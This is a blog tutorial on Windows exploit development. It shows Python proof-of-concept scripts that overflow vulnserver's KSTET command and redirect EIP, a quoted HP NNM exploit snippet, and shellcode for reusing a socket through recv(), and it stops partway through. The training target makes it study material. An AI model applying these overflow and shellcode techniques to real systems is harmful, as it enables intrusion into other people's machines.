---
title:  "Exploit Development: Second Stage Payload - WS_32.recv() Socket Reuse"
date:   2019-07-13
tags: [posts]
excerpt: "Reusing an existing socket connection to add a buffer of a user defined length."
---
Introduction
---
While doing further research on ways to circumvent constraints on buffer space, I stumbled accross a neat way to append a second stage user supplied buffer of a given length to an exploit. Essentially, we will be utilizing the [winsock.h](https://docs.microsoft.com/en-us/windows/win32/api/winsock/) header from the [Win32 API](https://docs.microsoft.com/en-us/windows/desktop/apiindex/windows-api-list) to write a few pieces of shellcode, in order to get parameters for a function call onto the stack. Once these parameters are on the stack, we will call the [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) function from __WS_32.dll__. This will allow us to pass a second stage buffer, in order to execute a useful piece of shellcode, like a shell. Let's get into it.

Replicating the Function Call
---
As mentioned before, in order to execute a successful exploit, we must find out where the function call is happening within the [vulnerable piece of software](https://github.com/stephenbradshaw/vulnserver). This is no different than the process of exploiting a vulnerable parameter in an HTTP request. Let's take a closer look at this.

Here is a snippet of source code from [muts'](https://twitter.com/muts?lang=en) famous HP NNM Exploit:

```python
import socket
import os
import sys

print "[*] HP NNM 7.5.1 OVAS.exe SEH Overflow Exploit (0day)"
print "[*] http://www.offensive-security.com"

# --- #

buffer="GET http://" + evilcrash+ "/topology/homeBaseView HTTP/1.1\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+= bindshell 
```

If we take a look at the `buffer` parameter, we can clearly see that this is an HTTP request. The vulnerability seems to arise from the [Host](https://www.itprotoday.com/devops-and-software-development/what-host-header) header. So, in order for this exploit to be successful- one must successfully replicate a valid HTTP request. 

This is synonymous what the `recv()` function requires. We are tasked with successfully fulfilling valid parameters in order to call the function.

Let's take a look at the Microsoft documentation on this.

Looking at the function call, here are the parameters needed. Let's break this down:

```c++
int recv(
  SOCKET s,
  char   *buf,
  int    len,
  int    flags
);
```

The __first__ parameter, `SOCKET s`, is the file descriptor that references the socket connection. A file descriptor is a piece of data that the Operating System uses to reference a certain resource (file, socket connection, I/OP resource, etc.). Since we will be working within the x86 architecture, this will look something like this- `0x00000090` (this number will vary). 

Also, one thing to remember, is a file descriptor is utilized by the OS. The file descriptor is not actually a raw value of `0x00000090` (or whatever value the OS is using). The OS would not know what to do with a this value, as it is not a coherent memory address- just an arbitrary value. The OS utilized a memory address that points to the fild descriptor value (a pointer).

The __second__ parameter, `char *buf` is a pointer to the memory location the buffer is received at. Essentially, when developing our second stage payload, we will want to specify a memory location our execution will eventually reach.

The __third__ parameter, `int len` is the size of the buffer. Remember, this is going to be a hexademical representation of the decimal value we supply. A shell is around 350-3500 bytes. Let's remmeber this going forward.

The __fourth__ parameter, `int flags`, is a numerical value that will allow for adding semantics/options to the function. We will just have this parameter set to `0`, as to not influence or change the function in any unintended way.

Finding the Call to WS_32.recv()
---
As any network based buffer overflow works, we find a vulnerable parameter, command, or other field- and send data to that parameter. Here is the POC does just that:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
crash = "\x41" * 2000

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

After executing the POC, here is what the debugger shows:

<img src="{{ site.url }}{{ site.baseurl }}/images/01.png" alt="">

After examining the crash, it seems as though EAX is going to be the best place for us to start building our shellcode.

Skipping some of the formalities, the POC has been updated to incorporate the proper offset to EIP and a `jmp eax` instruction:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
crash = "\x41" * 70
crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

Let' find the function call now. Close Immunity and vulnserver.exe. Restart vulnserver.exe and the reattach within Immunity.

__Right click__ on any disassembled instruction, and select __View > Module 'vulnserv'__ (the executable itself).

<img src="{{ site.url }}{{ site.baseurl }}/images/03.png" alt="">

Now that we are viewing the exedcutable itself, again, __right click__ on any disassembled instruction. Select __Search For > All intermodular calls__. This refers to all calls to the __.dll__ dependencies of the application. As the `recv()` function is apart of __WS_32.dll__, we will need to search for the intermodular calls.

Find the __WS_32.recv__ function in the __Destination__ column. (Pro tip: click on the __Destintation__ header to sort alphabetically):

<img src="{{ site.url }}{{ site.baseurl }}/images/04.png" alt="">

Set a breakpoint:

<img src="{{ site.url }}{{ site.baseurl }}/images/05.png" alt="">

Restart the application in Immunity and start it (don't unattach it, but restart with the __rewind__ button.) and execute the updated POC:

Execution is paused

<img src="{{ site.url }}{{ site.baseurl }}/images/06.png" alt="">

...and we see our parameters on the stack!:

<img src="{{ site.url }}{{ site.baseurl }}/images/07.png" alt="">

LIFO (Last In First Out)
---
Let's remember one thing about the stack. The stack is a data structure that accepts data in a last in first out format. This means the first piece of data pushed onto the stack, will be the last item to be popped off the stack, or executed. Knowing this, we will need to push our parameters on the stack, in reverse order. Having said this, we will need to manipulate our file descriptor first. 

Generating the File Descriptor
---
Although we weill need to push our parameters on the stack in reverse order, we will start by generating the file descriptor. 

From the observations above- it seems that our file descriptor is the value `0x00000088`. Knowing this, we will create a piece of shellcode to reflect this. Here are the instructions, using [nasm_shell](https://github.com/fishstiqz/nasmshell):

```console
nasm > xor ecx, ecx
00000000  31C9              xor ecx,ecx
nasm > add cl, 0x88
00000000  80C188            add cl,0x88
nasm > push ecx
00000000  51                push ecx
nasm > mov edi, esp
00000000  89E7              mov edi,esp
```

The first instruction of:

```console
xor ecx, ecx
```

is to 'zero' out the ECX register, for our calculations. Remember, XOR'ing any value with itself, will result in a zero value.

The second instruction:

```console
add cl, 0x88
```

will add `0x88` bytes to the CL register. The CL register (counter low), is an 8 bit register (with CH, or counter high)that makes up the 16 bit register CX. CX is a 16 bit register that makes up the 32 bit register (x86) ECX. 

Here is a diagram that outlines this better:

<img src="{{ site.url }}{{ site.baseurl }}/images/08.png" alt="">

A Word About Data Sizes
--
Remember, a 32 bit register, when referencing the data inside of it, is known as a [__DWORD__](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/262627d8-3418-4627-9218-4ffe110850b2), or a double word. A 16 bit register when referencing the data in it, is known as a [__WORD__](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/f8573df3-a44a-4a50-b070-ac4c3aa78e3c). An 8 bit register's data is known as a [__byte__](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/d7edc080-e499-4219-a837-1bc40b64bb04). 

The 32 bit register is comprised of 8 bytes: `0x12345678`. The number 8 represents the most significant byte. The CL register also is at the most significat byte location in the ECX register. This means, if we add 0x88 to the CL register, ECX will look like this:

```console
0x00000088
        ↑↑
        cl
```

The reason we would want to add directly to CL, instead of ECX- is because this guarentees our data will be properly inserted into the register. Adding directly to a register may result in bytes being placed in unintended locations. We will use this knowledge later, as well.


The third instruction:

```console
push ecx
```
is to get the value onto the top of the stack. In other words, the value of `0x00000088` is being stored in ESP- as ESP contains the value of the item on top of the stack.

The last instruction:

```console
mov edi, esp
```

is in order move the contents of ESP, into EDI. The reason we do this, is because this will create a memory address (ESP's address, which contains a pointer to the value `0x00000088`). EDI now is a memory address that points to the value of the file descriptor. 

Although we did not find the ACTUAL file desciptor the OS generated, we are essentially "tricking" the OS into thinking this is the file description. The OS is only looking for a pointer that references teh value `0x00000088`, not a specific memory address.

Flags
---
Now that the file descriptor is out of the way- we will start with the last parameter, the flags. 
